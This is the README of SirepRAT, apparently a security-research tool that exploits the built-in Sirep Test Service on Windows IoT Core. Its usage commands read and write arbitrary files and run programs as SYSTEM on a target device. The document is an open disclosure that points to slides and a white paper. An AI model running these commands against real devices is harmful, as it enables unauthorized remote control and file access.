# SirepRAT - RCE as SYSTEM on Windows IoT Core
**SirepRAT** Features full RAT capabilities without the need of writing a real RAT malware on target.

## Context

The method is exploiting the Sirep Test Service that’s built in and running on the official images offered at Microsoft’s site. This service is the client part of the HLK setup one may build in order to perform driver/hardware tests on the IoT device. It serves the Sirep/WPCon/TShell protocol.

We broke down the Sirep/WPCon protocol and demonstrated how this protocol exposes a remote command interface for attackers, that include RAT abilities such as get/put arbitrary files on arbitrary locations and obtain system information.

Based on the findings we have extracted from this research about the service and protocol, we built a simple python tool that allows exploiting them using the different supported commands. We called it SirepRAT.

It features an easy and intuitive user interface for sending commands to a Windows IoT Core target. It works on any cable-connected device running Windows IoT Core with an official Microsoft image.


## Slides and White Paper

Slides and research White Paper are [**in the docs folder**](https://github.com/SafeBreach-Labs/SirepRAT/tree/master/docs)


## Usage

#### Download File
```bash
python SirepRAT.py 192.168.3.17 GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" -v
```

#### Upload File
```bash
python SirepRAT.py 192.168.3.17 PutFileOnDevice --remote_path "C:\Windows\System32\uploaded.txt" --data "Hello IoT world!"
```

#### Run Arbitrary Program
```bash
python SirepRAT.py 192.168.3.17 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\hostname.exe"
```  
With arguments, impersonated as the currently logged on user:
```bash
python SirepRAT.py 192.168.3.17 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c echo {{userprofile}}"
```  
(Try to run it without the _as_logged_on_user_ flag to demonstrate the SYSTEM execution capability)

#### Get System Information
```bash
python SirepRAT.py 192.168.3.17 GetSystemInformationFromDevice
```

#### Get File Information
```bash
python SirepRAT.py 192.168.3.17 GetFileInformationFromDevice --remote_path "C:\Windows\System32\ntoskrnl.exe"
```

#### See help for full details:
```bash
python SirepRAT.py --help
```

## Authors

**Dor Azouri** ([@bemikre](https://twitter.com/bemikre))

## License

[BSD 3](https://github.com/SafeBreach-Labs/AltFS/blob/master/LICENSE) - clause "New" or "Revised" License